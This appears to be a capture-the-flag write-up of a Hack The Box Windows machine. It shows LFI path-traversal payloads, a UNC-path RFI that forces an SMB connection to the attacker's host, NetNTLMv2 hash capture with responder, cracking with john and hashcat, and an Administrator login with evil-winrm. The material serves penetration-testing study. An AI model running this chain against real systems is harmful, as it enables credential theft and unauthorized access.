---
tags:
  - Windows
  - HTTP
  - RFI
  - responder
---

... is a HTB machine which hosts a web-page with a LFI and RFI vulnerability. Using the RFI, it is possible to send a NTLM challenge to the server, which results in a crackable hash. The password can then be used to connect to the machine using `winrm`. 

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Both ports are technically reachable via the browser, as they serve `HTTP` responses to requests. Port 5985 is a bit different though, because it is a Windows API which enables the communication between applications. It also enables remote users to manage the machine using `winrm` (similar to `ssh` but for windows).

When visiting the web service on port 80, i get redirected to the domain `unika.htb`. As that domain is not known by my DNS, it cannot be resolved into a IP address. 
To still successfully resolve it, a small edit must be made on the `/etc/hosts` file on the linux file-system. This file acts like a local DNS, as it resolves host names to IP-addresses.  It requires elevated privileges (`sudo`) to do so. Any text editor such as `vim`, `nano` or `mousepad` will do, but this command does it without manually writing into the file:
```bash
echo "$IP unika.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

this now lets us see the web page!

### Initial Exploitation
I have clicked through the page and inspected the source code. Within that, i have searched for the string `a href`, as that then shows me all links to other resources which are on this site.
I have found two links which looked interesting:
```bash
<a href="/index.php?page=french.html">FR</a>
<a href="/index.php?page=german.html">DE</a>
```
They are interesting, because they use a `HTTP-GET` parameter alongside a `HTML` file. What this means is that the user of the website gets to control what file gets shown to him.
The first thing to do here is to see if we can traverse the file system using `../` operators to view files which we are not intended to view. To do so, a file is needed which is always on the system. On linux systems such a file may be `/etc/passwd` or `/etc/hosts`. The `nmap` scan indicates that this might be a Windows machine though. On windows, such files may be `C:\Windows\win.ini`, or `C:\Windows\System32\drivers\etc\hosts`. To check if they are reachable, visit this page:
```http
http://unika.htb/index.php?page=../../Windows/win.ini
```
and it works! It it now possible to read files on the target system, if the name is known and the current user is allowed to do so.

The next question is, if we can reference files on our own system. I quickly create a test file using `echo "test" > test.txt`, and start my `http` listener using `python3 -m http.server 80`. When visiting my own IP (found out using `ip a` on `tun0`):
```http
http://unika.htb/index.php?page=http://<my-IP>/test.txt
```
... it does not work. The `http://` wrapper is disabled to prevent this attack.

This is where a UNC (Universal Naming Convention) path comes into play. These are paths which look like an URL, but they have no wrapper, (e.g. `//<my-IP>/test.txt`). They are used in windows to address network resources such as files or printers. 
As the `page` parameter is being fed into the `include()` function of PHP, Windows may try to initiate an SMB connection from this UNC. If that happens, we can trick the machine into thinking that it needs authentication to access our SMB share. If it successfully gets tricked, the Windows machine sends us their NetNTLMv2 hash (which is crackable).

To achieve this tricking, a tool called `responder` can be used. It listens to multiple different protocols. If anyone requests a resource of those protocols, `responder` always responds with "You need authentication for that!", and that authentication happens with an NetNTLMv2 hash on windows, which we can then read. If the password used for the hash was weak, it is easily crackable afterwards! `responder` can be started with this command:
```bash
sudo responder -I tun0
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -I: specify interface. here tun0, as that is the interface of the VPN
```

When a request to `//<my-IP>/test.txt` is made, `responder` successfully retrieves the hash of the target! If the hash is lost, retrieve it in `/usr/share/responder/logs/SMB-NTLMv2...txt`. This hash should then be written into a `hash.txt` file to crack it.

For cracking, there are two options. The first one `john` (the ripper), which automatically detects the hash type but is slower and older. `hashcat` on the other hand is a bit faster, but you need to identify the hash type and provide it to `hashcat`. A collection of all hash types of `hashcat` can be found [here](https://github.com/unstable-deadlock/brashendeavours.gitbook.io/blob/master/pentesting-cheatsheets/hashcat-hash-modes.md). The `NetNTLMv2` hash equates to mode `5600`. 

The approach is to crack the hash using a word-list (try to recreate the hash with each entry of the word-list), as that is sufficient in most CTFs. The wordlist of choice is `/usr/share/wordlists/rockyou.txt`. A pure brute force attack would try every combination of every letter and number, but that would take too long.
Below, both versions of cracking are shown:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash2.txt
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist
```

```
# or
```

```bash
hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt --show
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -m: specify the mode of hash cracking
# --show: show the cleartext password after cracking
```

With the password obtained, it is possible to log into the machine using `winrm` (similar to `ssh`), as that port is open on the machine. In linux, this can be achieved using the tool `evil-winrm` as follows:
```bash
evil-winrm -i $IP -u Administrator -p <password>
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -i: remote IP or hostname
# -u: username, here Administrator
# -p: password, insert cracked password here!
```

After logging on, the flag can be found on the desktop of the user `mike` (so that you cant read the `flag.txt` using the LFI).